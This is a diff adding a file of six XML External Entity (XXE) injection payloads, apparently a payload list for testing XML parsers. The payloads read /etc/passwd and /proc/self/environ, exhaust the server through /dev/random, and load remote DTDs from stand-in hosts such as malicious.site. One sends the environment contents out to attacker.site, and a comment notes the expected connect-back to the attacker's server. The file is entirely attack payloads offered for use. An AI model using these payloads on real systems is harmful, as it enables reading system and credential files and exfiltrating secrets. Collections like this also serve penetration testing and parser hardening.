@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0" ?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY xxe SYSTEM "file:///dev/random" >]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe PUBLIC "-//B/A/EN" "http://example.com/evil.dtd">
+]>
+<foo>&xxe;</foo>
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data ANY>
+<!ENTITY % dtd SYSTEM "http://malicious.site/evil.dtd">
+%dtd;
+]>
+<data>&send;</data>
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY>
+<!ENTITY % xxe SYSTEM "file:///proc/self/environ">
+<!ENTITY callme SYSTEM "http://attacker.site/log.jsp?%xxe;">
+]>
+<foo>&callme;</foo>
+
+<!-- Expecting the server to try to connect back to attacker's server -->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.site/malicious.dtd">
+%xxe;
+]>
+<foo></foo>
